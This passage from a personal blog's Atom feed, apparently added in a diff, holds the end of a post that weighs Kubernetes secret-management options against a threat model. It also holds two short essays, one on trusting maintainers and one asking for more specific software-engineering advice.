+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;tasks&#x2F;administer-cluster&#x2F;encrypt-data&#x2F;&quot;&gt;Etcd encryption at rest&lt;&#x2F;a&gt; involves encrypting all Secrets inside etcd with a key that is... on the same filesystem as etcd itself. So &lt;em&gt;none&lt;&#x2F;em&gt; of the four attacks in our threat model are mitigated here. Not even the &amp;quot;physical access&amp;quot; attack since the key is stored on the same disk! Or at least another disk that is accessible from the same host (not even an option mentioned in the docs).&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;etcd-encryption-via-kms&quot;&gt;Etcd encryption via KMS&lt;&#x2F;h4&gt;
+&lt;p&gt;You can replace your encryption key from the above method with a &lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;tasks&#x2F;administer-cluster&#x2F;kms-provider&#x2F;&quot;&gt;Key Management Service from your favorite cloud provider&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;While this is listed as the &amp;quot;Strongest&amp;quot; method, it&#x27;s basically just as insecure according to our threat model. An attacker who can access the node can just mimic what etcd does and decrypt the secrets before exfiltrating them. At least this mitigates physical access to the disk, if and only if the KMS client is authenticating to your cloud provider with an auto-rotating, multi-factor token.&lt;&#x2F;p&gt;
+&lt;p&gt;Using this option requires a hard dependency on your cloud provider, a lot of complexity, and a BIG blast radius if it ever breaks. If you&#x27;re forced to encrypt secrets at rest for compliance, this is unfortunately your best option despite it not tangibly benefitting your security posture.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;bitnami-sealed-secrets&quot;&gt;Bitnami Sealed Secrets&lt;&#x2F;h4&gt;
+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;bitnami-labs&#x2F;sealed-secrets&quot;&gt;Sealed Secrets&lt;&#x2F;a&gt; really aren&#x27;t an alternative to secrets, but I&#x27;ve seen people think they are. Sealed Secrets allow you to store encrypted secrets in version control. When you &lt;code&gt;kubectl apply&lt;&#x2F;code&gt; a SealedSecret to your cluster, it gets automatically unencrypted and converted into plain Kubernetes Secrets by the Sealed Secrets controller.&lt;&#x2F;p&gt;
+&lt;p&gt;Since SealedSecrets turn into plain Secrets, no attacks in our threat model are mitigated. If you have no other safe place to store Secrets, SealedSecrets is a good option, but our threat model considers out-of-cluster storage of secrets to be out of scope.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;vault-sidecar-injector&quot;&gt;Vault Sidecar Injector&lt;&#x2F;h4&gt;
+&lt;p&gt;Here&#x27;s the big one people point to. At its core, Vault is just a key-value store with a few key features:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;A clever &lt;a href=&quot;https:&#x2F;&#x2F;www.vaultproject.io&#x2F;docs&#x2F;concepts&#x2F;seal&quot;&gt;Shamir sealing process&lt;&#x2F;a&gt;, which people immediately disable in favor of &lt;a href=&quot;https:&#x2F;&#x2F;www.vaultproject.io&#x2F;docs&#x2F;concepts&#x2F;seal#auto-unseal&quot;&gt;auto-unsealing&lt;&#x2F;a&gt; which negates the benefits of sealing just like etcd encryption via KMS.&lt;&#x2F;li&gt;
+&lt;li&gt;A rich policy language, which few people bother to learn.&lt;&#x2F;li&gt;
+&lt;li&gt;Great auditing, which no one monitors.&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;So in the end, Vault is just a key-value store unless you&#x27;re paying $$$ for a managed Vault instance or a team of in-house Vault experts. I&#x27;ve worked for a company where we had a whole team running HSM-backed Enterprise Vault, but that thing still went down all the time.&lt;&#x2F;p&gt;
+&lt;p&gt;But let&#x27;s say you have the deep pockets for an impossibly-well-maintained Vault instance. You&#x27;ve just installed the &lt;a href=&quot;https:&#x2F;&#x2F;www.vaultproject.io&#x2F;docs&#x2F;platform&#x2F;k8s&#x2F;injector&quot;&gt;Vault Sidecar Injector&lt;&#x2F;a&gt; in your Kubernetes cluster. Do you get enough security out of this complex arrangement to be worth it? I&#x27;d argue no.&lt;&#x2F;p&gt;
+&lt;p&gt;The sidecar injector works by modifying pods to have a Vault client sidecar which authenticates to your Vault server, downloads the secret, and stores it in a shared-memory volume which your app can access like a regular file.&lt;&#x2F;p&gt;
+&lt;p&gt;For Attack #1: Since the secret is still in memory, attackers on the node can still steal it.&lt;&#x2F;p&gt;
+&lt;p&gt;For Attack #2 and #3: If an attacker hacks any node (worker or control plane), they can run any pod with the right Vault annotations and steal the secrets.&lt;&#x2F;p&gt;
+&lt;p&gt;For Attack #4: If someone accesses the physical node, they can&#x27;t get the secrets from disk, but they can get vault credentials (tied to the serviceaccount with a plain Secret) and steal the secrets that way if you are running Vault inside Kubernetes.&lt;&#x2F;p&gt;
+&lt;p&gt;However, you still have to worry about physical access to the server where Vault is running. Vault encrypts data at rest when it is &amp;quot;sealed&amp;quot;, but if you&#x27;re using auto-unsealing, an attacker can mimic that process using your on-disk cloud credentials. Heck, someone with physical access to your server need not bother with reading your disk; they can just &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;carmaa&#x2F;inception&quot;&gt;dump the RAM&lt;&#x2F;a&gt; directly if you have a free PCI slot.&lt;&#x2F;p&gt;
+&lt;p&gt;For Attack #5: The complexity of running Vault greatly increases your attack surface. I trust HashiCorp to catch issues more than most companies, but more moving parts is always more risk. Sometimes that risk is worth it (like yes, hashing passwords is more complex than not, but the pros clearly outweigh the cons), but only if some of the other 4 attacks are mitigated.&lt;&#x2F;p&gt;
+&lt;p&gt;So according to our threat model, using Vault introduces a few layers of indirection, but ultimately does not address more attacks than plain Kubernetes Secrets. Just using encrypted disks and storing the key somewhere safe would provide the same level of security MUCH more simply and cheaply.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;&#x2F;h2&gt;
+&lt;p&gt;By creating a threat model that includes the kinds of attacks you want to mitigate, it&#x27;s clear that managing secrets safely is extremely difficult. The problem is NOT that secrets are just base64 encoded; that was never meant as a security feature. And the problem cannot be simply waved away by software&#x2F;cloud providers and their flashy documentation.&lt;&#x2F;p&gt;
+&lt;p&gt;For something as security-sensitive and difficult as storing secrets, start with a threat model. If multiple solutions have similar security according to the threat model, pick the simpler one to reduce the overall attack surface.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;em&gt;Edited to improve cohesiveness 2022-05-01&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>Trust the Maintainers</title>
+		<published>2021-08-14T00:00:00+00:00</published>
+		<updated>2021-08-14T00:00:00+00:00</updated>
+		<link rel="alternate" href="/blog/2021/maintenance/" type="text/html"/>
+		<id>/blog/2021/maintenance/</id>
+		<content type="html">&lt;p&gt;Since &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Colonial_Pipeline_ransomware_attack&quot;&gt;cyber attacks&lt;&#x2F;a&gt;, a &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Surfside_condominium_collapse&quot;&gt;building collapse&lt;&#x2F;a&gt;, and an &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Infrastructure_Investment_and_Jobs_Act&quot;&gt;infrastructure bill&lt;&#x2F;a&gt; have been in the headlines recently, I think the time has come for us to re-assess our relationship with &lt;em&gt;maintenance&lt;&#x2F;em&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;While I work in the &amp;quot;tech&amp;quot; field, I don&#x27;t align myself with inventors, entrepreneurs, or green-field software engineers. I align myself with the whole spectrum of &amp;quot;maintainers&amp;quot;, like civil engineers, power plant operators, janitors, building inspectors, security compliance officers, mechanics, etc. These jobs are mostly all considered respectable, but a building inspector will never get the same prestige as someone who invents a new gadget, founds a new company, or develops a new popular app. Why is that?&lt;&#x2F;p&gt;
+&lt;p&gt;There&#x27;s an organization called &lt;a href=&quot;https:&#x2F;&#x2F;themaintainers.org&#x2F;why-do-people-neglect-maintenance&#x2F;&quot;&gt;The Maintainers&lt;&#x2F;a&gt; which has a comprehensive list of reasons why we don&#x27;t value maintenance, ranging from cognitive biases to historical reasons to financial incentives. But I&#x27;d like to focus on trust, and how mistrusting maintainers can lead to putting off maintenance.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;trust&quot;&gt;Trust&lt;&#x2F;h3&gt;
+&lt;p&gt;Trust has been dropping across the board according to the &lt;a href=&quot;https:&#x2F;&#x2F;www.edelman.com&#x2F;sites&#x2F;g&#x2F;files&#x2F;aatuss191&#x2F;files&#x2F;2021-03&#x2F;2021%20Edelman%20Trust%20Barometer.pdf&quot;&gt;Edelman Trust Barometer&lt;&#x2F;a&gt;. I think the ripple effects of this are also being felt by the maintainers of the world. Maintainers are always vying for the trust of decision-makers to get anything done. That leaky pipe won&#x27;t get fixed unless the suits approve the purchase order. But this imbalance of power is so frustratingly misplaced. The plumber who noticed the leaky pipes &lt;em&gt;is the subject-matter expert&lt;&#x2F;em&gt;. They are well-aware that new pipes cost money, but they&#x27;ve seen (or learned about) the risk of leaving it unfixed. The person holding the checkbook hasn&#x27;t. But somehow they get the final say? Why is the subject-matter expert not trusted to make the cost-benefit analysis?&lt;&#x2F;p&gt;
+&lt;p&gt;The world of software security is another example where trust is lacking. In my experience, half the work is just convincing leadership to care the tiniest bit about security, which requires trust. Since it&#x27;s difficult to explain e.g. a &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Side-channel_attack&quot;&gt;side-channel attack&lt;&#x2F;a&gt; to someone non-technical, your chances of getting resources devoted to fixing the issue are slim, unless they trust you already.&lt;&#x2F;p&gt;
+&lt;p&gt;I&#x27;d say usually this mistrust is unfounded (based on bias, misunderstanding, or otherwise). But it&#x27;s true there are some untrustworthy maintainers in our ranks. When kids get their first car, they&#x27;re often warned of crooked mechanics. Or in the software world, &amp;quot;&lt;a href=&quot;https:&#x2F;&#x2F;doi.org&#x2F;10.1109&#x2F;ICSE-SEIS52602.2021.00011&quot;&gt;resume-driven development&lt;&#x2F;a&gt;&amp;quot; is similarly a problem. Perhaps some kind of formal licensure could help build trust, like requiring adherence to the &lt;a href=&quot;https:&#x2F;&#x2F;ethics.acm.org&#x2F;code-of-ethics&#x2F;software-engineering-code&#x2F;&quot;&gt;ACM Software Engineering Code of Ethics&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;There&#x27;s no doubt that maintenance is necessary and that we can never seem to do enough of it. But setting aside the cognitive biases or financial incentives against it, consider how trusting subject-matter experts plays into it. Think of the last time an outsider completely butchered an explanation of your hobby or field of study; that&#x27;s how maintainers feel every time they get overruled by laymen.&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>Please make your advice more specific</title>
+		<published>2020-07-26T00:00:00+00:00</published>
+		<updated>2020-07-26T00:00:00+00:00</updated>
+		<link rel="alternate" href="/blog/2020/more-specifics/" type="text/html"/>
+		<id>/blog/2020/more-specifics/</id>
+		<content type="html">&lt;p&gt;To those of you who give advice on which languages, methodologies, architectures, or whatever else to use, I want to start by saying thank you. Your advice is vital to the growth of millions of people like me who are early in their careers.&lt;&#x2F;p&gt;
+&lt;p&gt;But I&#x27;ve noticed a pattern with software engineering advice that leads to over-engineering and unnecessary arguments. So I have a request:&lt;&#x2F;p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;em&gt;Please make your advice more specific&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;It&#x27;s too often overlooked that there isn&#x27;t just one type of &amp;quot;software&amp;quot;, thus it is rare for advice to be applicable to every situation. For example, advice for testing a small B2B web app might not work for embedded device firmware. But it might work for a large B2C web app. And since readers will rarely have experience in all of those situations, I think we should start being more explicit about the applicability of our advice.&lt;&#x2F;p&gt;
+&lt;p&gt;Being more specific might help address two big time sinks in the industry:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;en.wiktionary.org&#x2F;wiki&#x2F;cargo_culting&quot;&gt;Cargo-culting&lt;&#x2F;a&gt;, like when people read how great Kubernetes works for Netflix, but then they decide to use it for a little Django app (that was me a few years ago).&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;en.wiktionary.org&#x2F;wiki&#x2F;bikeshedding&quot;&gt;Bikeshedding&lt;&#x2F;a&gt;, like when people argue incessantly that a language is useless because it can&#x27;t be used in some niche.&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;A good start might be answering questions like the following:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Does your advice apply to my scale? (local restaurant website vs. Youtube.com)&lt;&#x2F;li&gt;
+&lt;li&gt;Does your advice apply to my type of product? (library, web app, CLI tool, firmware, on&#x2F;off-premise, etc.)&lt;&#x2F;li&gt;
+&lt;li&gt;Does your advice apply to my type of users? (developers, enterprises, regular people, etc.)&lt;&#x2F;li&gt;
+&lt;li&gt;If not, what should I use instead? (like &lt;a href=&quot;https:&#x2F;&#x2F;adamdrake.com&#x2F;command-line-tools-can-be-235x-faster-than-your-hadoop-cluster.html&quot;&gt;replacing Hadoop with &lt;code&gt;find&#x2F;xargs&#x2F;awk&lt;&#x2F;code&gt;&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Of course, it&#x27;s hard to find the right balance between hand-holding readers or just saying &amp;quot;buyer beware&amp;quot;. But hopefully spending time to add an extra subheading on &amp;quot;Applicability&amp;quot; to READMEs or blog posts will pay for itself in time spent over-engineering and arguing over minutiae.&lt;&#x2F;p&gt;
+</content>
+	</entry>
+</feed>
